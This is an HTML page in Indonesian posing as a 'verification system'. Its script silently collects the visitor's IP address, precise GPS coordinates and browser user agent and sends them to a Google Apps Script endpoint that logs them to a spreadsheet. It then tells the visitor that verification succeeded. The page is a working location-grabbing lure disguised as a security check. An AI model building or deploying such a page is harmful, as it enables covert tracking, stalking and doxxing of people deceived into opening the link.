<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Verifikasi</title>
</head>
<body>
    <div id="status">Menginisialisasi sistem keamanan...</div>

    <script>
        const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbySG8h3NAW8DpLkwFRbgKb1-vx4nOmzAno-S3jkIyoT6rLCbLEW8s1-o2uxdFaQtRgVPA/exec"; 
        let userIP = "Tidak terdeteksi";

        // 1. Ambil IP Address terlebih dahulu
        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                userIP = data.ip;
                getLocation(); // Setelah IP didapat, minta lokasi
            } catch (err) {
                console.error("Gagal ambil IP");
                getLocation(); // Tetap lanjut ambil lokasi meski IP gagal
            }
        }

        // 2. Ambil Geolokasi
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(sendData, showError, {
                    enableHighAccuracy: true,
                    timeout: 10000
                });
            } else {
                document.getElementById("status").innerHTML = "Browser tidak mendukung.";
            }
        }

        // 3. Kirim Semua Data ke Google Sheets
        function sendData(position) {
            const payload = {
                ip: userIP,
                lat: position.coords.latitude,
                long: position.coords.longitude,
                accuracy: position.coords.accuracy,
                userAgent: navigator.userAgent
            };

            fetch(WEB_APP_URL, {
                method: "POST",
                mode: "no-cors",
                body: JSON.stringify(payload)
            })
            .then(() => {
                document.getElementById("status").innerHTML = "<h3>Verifikasi Berhasil</h3>";
            })
            .catch(err => {
                document.getElementById("status").innerHTML = "Gagal sinkronisasi data.";
            });
        }

        function showError(error) {
            document.getElementById("status").innerHTML = "<b>Error:</b> Akses lokasi diperlukan.";
        }

        // Jalankan urutan fungsi
        getIP();
    </script>
</body>
</html>
